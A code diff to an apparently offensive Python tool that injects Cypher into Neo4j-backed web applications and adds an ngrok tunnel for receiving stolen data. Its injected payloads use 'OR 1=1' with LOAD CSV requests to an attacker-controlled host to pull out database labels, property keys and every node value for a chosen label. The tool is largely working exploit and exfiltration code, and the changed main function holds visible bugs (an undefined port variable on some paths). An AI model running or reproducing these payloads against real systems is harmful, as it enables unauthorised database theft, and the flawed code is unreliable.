@@ -12,8 +12,9 @@ import sys
 import json
 import os
 from tabulate import tabulate
+from pyngrok import ngrok
+import time
 
-# Global queue to store received data from HTTP requests
 data_queue = queue.Queue()
 
 # Helper functions
@@ -150,15 +151,14 @@ class Neo4jInjector:
     def exfil_data(self):
 
         print("Dumping labels count")
-        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l LOAD CSV FROM 'http://{self.exfil_ip}/?label_count='+l as x RETURN 0 as _0 // ")
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l LOAD CSV FROM '{self.exfil_ip}/?label_count='+l as x RETURN 0 as _0 // ")
 
         data = data_queue.get()  # Retrieve the next item from the queue
         parsed_data = extract_query_params(data)  # Use the previously defined function
         label_count = parsed_data.get('label_count', None)  # Extract the label value
-        print(label_count)
-
+        
         print("Dumping Labels")
-        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH DISTINCT label LOAD CSV FROM 'http://{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH DISTINCT label LOAD CSV FROM '{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")
 
         # Store labels
         labels = []
@@ -172,18 +172,17 @@ class Neo4jInjector:
         label = input(f"Select label to dump {labels}: ")
 
         # print("Dumping Properties")
-        # self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p as l RETURN 0 as _0 //")
+        # self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p LOAD CSV FROM '{self.exfil_ip}/?keys=' + p as l RETURN 0 as _0 //")
 
-        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y LOAD CSV FROM 'http://{self.exfil_ip}/?value_count=' + y as l RETURN 0 as _0 //")
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y LOAD CSV FROM '{self.exfil_ip}/?value_count=' + y as l RETURN 0 as _0 //")
 
 
         data = data_queue.get()  # Retrieve the next item from the queue
         parsed_data = extract_query_params(data)  # Use the previously defined function
         value_count = parsed_data.get('value_count', None)  # Extract the label value
-        print(value_count)
 
         print("Dumping Values Property=Value")
-        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT x,p LOAD CSV FROM 'http://{self.exfil_ip}/?' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //")
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT x,p LOAD CSV FROM '{self.exfil_ip}/?' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //")
 
 
         values = [] 
@@ -204,33 +203,50 @@ class Neo4jInjector:
         json_to_table(json_result)
 
         
-
-
-# Main function
 def main():
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
     parser.add_argument("-u", "--url", required=True, help="Target URL")
     parser.add_argument("-p", "--parameters", default="", help="Vulnerable parameters")
     parser.add_argument("-c", "--cookie", help="Optional cookie in format key=value")
     parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type")
-    parser.add_argument("-i", "--int", help="Network interface for dynamic IP retrieval")
+    parser.add_argument("-i", "--int", help="Network interface for dynamic IP retrieval, 'public' for ngrok")
     parser.add_argument("--listen-port", type=int, default=80, help="Listener port")
     args = parser.parse_args()
 
-    if not args.int:
-        args.exfil_ip = "127.0.0.1"
-    else:
-        args.exfil_ip = get_ip_address(args.int)
+    if args.int == "public":
+        ngrok_auth_token = os.getenv("NGROK_AUTHTOKEN")
+        if ngrok_auth_token:
+            ngrok.set_auth_token(ngrok_auth_token)
+        else:
+            print("Ngrok auth token not set. Please set the NGROK_AUTH_TOKEN environment variable.")
+            sys.exit(1)
+        start_ngrok = ngrok.connect(args.listen_port, "tcp")
+        url = start_ngrok.public_url.replace("tcp://", "http://")
+        hostname, port = url.split("://")[1].split(":")
+        args.exfil_ip = f"http://{hostname}"
+        old_port = args.listen_port
+        args.listen_port = int(port)
+        
+        print(f"External IP: {args.exfil_ip}, External Port: {args.listen_port}")
 
-    listener = Listener(args.listen_port)
+    elif args.int:
+        args.exfil_ip = f"http://{get_ip_address(args.int)}"
+    else:
+        args.exfil_ip = "127.0.0.1"
+
+
+    listener = Listener(old_port)
     listener_thread = threading.Thread(target=listener.start_listener, daemon=True)
-    listener_thread.start()
+    listener_thread.start() 
 
     injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)
     injector.exfil_data()
 
     listener.stop_listener()
     listener_thread.join()
+
+    if args.int == "public":
+        ngrok.disconnect(start_ngrok.public_url)
 
 if __name__ == "__main__":
     main()
